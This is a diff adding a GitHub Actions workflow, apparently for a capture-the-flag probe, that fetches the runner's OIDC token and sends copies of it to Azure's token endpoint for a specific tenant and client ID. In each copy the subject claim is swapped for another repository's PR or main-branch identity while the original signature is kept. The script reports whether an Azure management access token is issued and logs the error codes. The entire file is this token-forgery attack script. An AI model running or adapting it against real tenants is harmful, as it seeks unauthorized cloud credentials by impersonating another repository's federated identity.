@@ -1,0 +1,56 @@
+name: Check Azure trust matching order
+on:
+  push:
+    branches: [ctf-oidc-probe]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe only Azure federation error codes
+        env:
+          CLIENT_ID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
+          TENANT_ID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
+        run: |
+          python3 - <<'PY'
+          import base64,json,os,re,urllib.error,urllib.parse,urllib.request
+          url=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=api%3A%2F%2FAzureADTokenExchange'
+          req=urllib.request.Request(url,headers={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']})
+          with urllib.request.urlopen(req,timeout=20) as response:
+              jwt=json.load(response)['value']
+          parts=jwt.split('.')
+          payload=json.loads(base64.urlsafe_b64decode(parts[1]+'='*(-len(parts[1])%4)))
+          print('issuer:',payload.get('iss'),'audience:',payload.get('aud'),'real subject:',payload.get('sub'))
+          variants=[
+              ('unaltered',None),
+              ('base numeric PR','repo:duyhhh-oss@345511389/tebamoto-platform@1427521762:pull_request'),
+              ('base numeric main','repo:duyhhh-oss@345511389/tebamoto-platform@1427521762:ref:refs/heads/main'),
+              ('base legacy PR','repo:duyhhh-oss/tebamoto-platform:pull_request'),
+              ('base legacy main','repo:duyhhh-oss/tebamoto-platform:ref:refs/heads/main'),
+          ]
+          for label,subject in variants:
+              if subject:
+                  changed=dict(payload,sub=subject)
+                  middle=base64.urlsafe_b64encode(json.dumps(changed,separators=(',',':')).encode()).decode().rstrip('=')
+                  assertion=parts[0]+'.'+middle+'.'+parts[2]
+              else:
+                  assertion=jwt
+              form=urllib.parse.urlencode({
+                  'client_id':os.environ['CLIENT_ID'],
+                  'scope':'https://management.azure.com/.default',
+                  'grant_type':'client_credentials',
+                  'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
+                  'client_assertion':assertion}).encode()
+              req=urllib.request.Request(
+                  'https://login.microsoftonline.com/'+os.environ['TENANT_ID']+'/oauth2/v2.0/token',
+                  data=form)
+              try:
+                  with urllib.request.urlopen(req,timeout=20) as response: result=json.load(response)
+              except urllib.error.HTTPError as error: result=json.load(error)
+              desc=result.get('error_description','')
+              code=re.search(r'AADSTS[0-9]+',desc)
+              print(label,'OK' if 'access_token' in result else result.get('error'),
+                    code.group(0) if code else 'no-code',flush=True)
+          PY
